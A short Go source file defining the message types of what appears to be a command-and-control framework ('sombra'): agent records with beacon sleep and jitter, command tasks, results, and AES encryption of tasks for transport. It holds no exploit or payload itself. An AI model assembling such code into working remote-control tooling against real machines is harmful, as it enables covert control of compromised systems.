package transport

import (
	"encoding/json"

	"sombra/cmd/crypto"
)

type Agent struct {
	IP       string
	ExtIP    string
	Hostname string
	Sleep    string
	Jitter   string
	OS       string
	UID      string
	PID      string
}

type Task struct {
	UID       string
	CommandID string
	Command   string
}

type Result struct {
	CommandID string
	Result    string
}

type Envelope struct {
	Agent  Agent
	Task   Task
	Result Result
}

type Package struct {
	UID string
	Pkg []byte
}

func (e *Envelope) Package(key []byte, nonce []byte) (*Package, error) {
	task, err := json.Marshal(e.Task)
	if err != nil {
		return nil, err
	}

	encrypted, err := crypto.EncryptAES(key, nonce, []byte(task))
	if err != nil {
		return nil, err
	}

	return &Package{
		UID: e.Task.UID,
		Pkg: encrypted,
	}, nil
}
